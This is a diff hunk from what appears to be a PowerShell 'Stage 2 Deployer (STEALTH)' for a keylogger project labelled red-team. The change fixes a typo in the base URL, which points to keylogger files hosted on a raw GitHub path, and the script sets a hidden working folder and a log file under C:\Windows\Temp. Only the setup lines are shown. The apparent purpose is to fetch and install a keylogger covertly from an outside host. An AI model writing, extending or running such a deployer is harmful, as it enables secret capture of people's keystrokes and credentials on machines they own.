@@ -1,7 +1,7 @@
 # Project Cerberus - Stage 2 Deployer (STEALTH)
 
 $dir  = "C:\Windows\Temp\cerberus"
-$base = "ttps://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/v2.0/red-team/keylogger/deploy.ps1"
+$base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/v2.0/red-team/keylogger"
 $log  = "C:\Windows\Temp\cerberus_deploy.log"
 
 function Log($msg) {
